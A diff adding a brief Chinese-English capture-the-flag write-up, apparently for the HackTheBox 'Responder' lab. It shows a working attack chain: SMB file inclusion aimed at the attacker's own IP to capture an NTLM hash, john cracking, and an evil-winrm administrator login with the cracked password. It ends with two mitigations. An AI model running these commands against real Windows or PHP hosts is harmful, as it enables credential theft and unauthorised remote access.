@@ -1,0 +1,30 @@
+Responder
+
+原理：
+
+In the PHP configuration file php.ini , "allow_url_include" wrapper is set to "Off" by default, indicating that PHP does not load remote HTTP or FTP URLs to prevent remote file inclusion attacks. However, even if allow_url_include and allow_url_fopen are set to "Off", PHP will not prevent the loading of SMB URLs.In our case, we can misuse this functionality to steal the NTLM hash
+
+利用条件：
+
+5985 Windows 远程管理服务（WinRM）端口开放
+
+网站文件php文件读取 
+
+步骤：
+
+利用网站文件读取 用smb协议访问局域网内共享资源 主机转发NTLM密钥 解密 用evil-winrm登陆主机
+
+```bash
+#WriteUp
+sudo python3 [Responder.py](http://responder.py/) -I tun0
+http://unika.htb/?page=//${tun0IP}/somefile
+john -w=/usr/share/wordlists/rockyou.txt hash.txt
+evil-winrm -i ${target} -u administrator -p badminton
+#Get-ChildItem -Path C:\ -Filter "flag.txt" -Recurse -ErrorAction SilentlyContinue
+```
+
+修复：
+
+5986 https管理端口
+
+使用 Kerberos 认证
